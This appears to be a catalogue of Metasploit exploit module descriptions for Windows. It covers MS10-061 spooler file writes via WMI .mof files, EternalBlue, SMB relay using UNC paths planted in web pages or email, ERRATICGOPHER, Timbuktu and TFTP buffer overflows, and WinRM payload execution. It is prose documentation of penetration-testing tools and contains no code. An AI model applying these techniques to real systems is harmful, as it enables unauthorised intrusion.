This module exploits the RPC service impersonation vulnerability detailed in Microsoft Bulletin MS10-061. By making a specific DCE RPC request to the StartDocPrinter procedure, an attacker can impersonate the Printer Spooler service to create a file. The working directory at the time is %SystemRoot%\system32. An attacker can specify any file name, including directory traversal or full paths. By sending WritePrinter requests, an attacker can fully control the content of the created file. In order to gain code execution, this module writes to a directory used by Windows Management Instrumentation (WMI) to deploy applications. This directory (Wbem\Mof) is periodically scanned and any new .mof files are processed automatically. This is the same technique employed by the Stuxnet code found in the wild.

windows/smb/ms17_010_eternalblue
This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads.

windows/smb/smb_relay
This module will relay SMB authentication requests to another host, gaining access to an authenticated SMB session if successful. If the connecting user is an administrator and network logins are allowed to the target machine, this module will execute an arbitrary payload. To exploit this, the target system must try to authenticate to this module. The easiest way to force a SMB authentication attempt is by embedding a UNC path (\SERVER\SHARE) into a web page or email message. When the victim views the web page or email, their system will automatically connect to the server specified in the UNC share (the IP address of the system running this module) and attempt to authenticate. Unfortunately, this module is not able to clean up after itself. The service and payload file listed in the output will need to be manually removed after access has been gained. The service created by this tool uses a randomly chosen name and description, so the services list can become cluttered after repeated exploitation. The SMB authentication relay attack was first reported by Sir Dystic on March 31st, 2001 at @lanta.con in Atlanta, Georgia. On November 11th 2008 Microsoft released bulletin MS08-068. This bulletin includes a patch which prevents the relaying of challenge keys back to the host which issued them, preventing this exploit from working in the default configuration. It is still possible to set the SMBHOST parameter to a third-party host that the victim is authorized to access, but the "reflection" attack has been effectively broken. As of Feb 2022 - this module does not support SMB 1.

windows/smb/smb_rras_erraticgopher
This module exploits an overflow in the Windows Routing and Remote Access Service (RRAS) to execute code as SYSTEM. The RRAS DCERPC endpoint is accessible to unauthenticated users via SMBv1 browser named pipe on Windows Server 2003 and Windows XP hosts; however, this module targets Windows Server 2003 only. Since the service is hosted inside svchost.exe, a failed exploit attempt can cause other system services to fail as well. The module has been successfully tested on: Windows Server 2003 SP0 (x86); Windows Server 2003 SP1 (x86); Windows Server 2003 SP2 (x86); and Windows Server 2003 R2 SP2 (x86).

windows/smb/smb_shadow
This module will intercept direct SMB authentication requests to another host, gaining access to an authenticated SMB session if successful. If the connecting user is an administrator and network logins are allowed to the target machine, this module will execute an arbitrary payload. To exploit this, the target system must try to autheticate to another host on the local area network. SMB Direct Session takeover is a combination of previous attacks. This module is dependent on an external ARP spoofer. The builtin ARP spoofer was not providing sufficient host discovery. Bettercap v1.6.2 was used during the development of this module. The original SMB relay attack was first reported by Sir Dystic on March 31st, 2001 at @lanta.con in Atlanta, Georgia.

windows/smb/timbuktu_plughntcommand_bof
This module exploits a stack based buffer overflow in Timbuktu Pro version <= 8.6.6 in a pretty novel way. This exploit requires two connections. The first connection is used to leak stack data using the buffer overflow to overwrite the nNumberOfBytesToWrite argument. By supplying a large value for this argument it is possible to cause Timbuktu to reply to the initial request with leaked stack data. Using this data allows for reliable exploitation of the buffer overflow vulnerability. Props to Infamous41d for helping in finding this exploitation path. The second connection utilizes the data from the data leak to accurately exploit the stack based buffer overflow vulnerability. TODO: hdm suggested using meterpreter's migration capability and restarting the process for multishot exploitation.

windows/tftp/tftpserver_wrq_bof
This module exploits a vulnerability found in TFTP Server 1.4 ST. The flaw is due to the way TFTP handles the filename parameter extracted from a WRQ request. The server will append the user-supplied filename to TFTP server binary's path without any bounds checking, and then attempt to check this path with a fopen(). Since this isn't a valid file path, fopen() returns null, which allows the corrupted data to be used in a strcmp() function, causing an access violation. Since the offset is sensitive to how the TFTP server is launched, you must know in advance if your victim machine launched the TFTP as a 'Service' or 'Standalone' , and then manually select your target accordingly. A successful attempt will lead to remote code execution under the context of SYSTEM if run as a service, or the user if run as a standalone. A failed attempt will result a denial-of-service.

windows/winrm/winrm_script_exec
This module uses valid credentials to login to the WinRM service and execute a payload. It has two available methods for payload delivery: Powershell 2 (and above) and VBS CmdStager. The module will check if Powershell is available, and if so uses that method. Otherwise it falls back to the VBS CmdStager which is less stealthy.
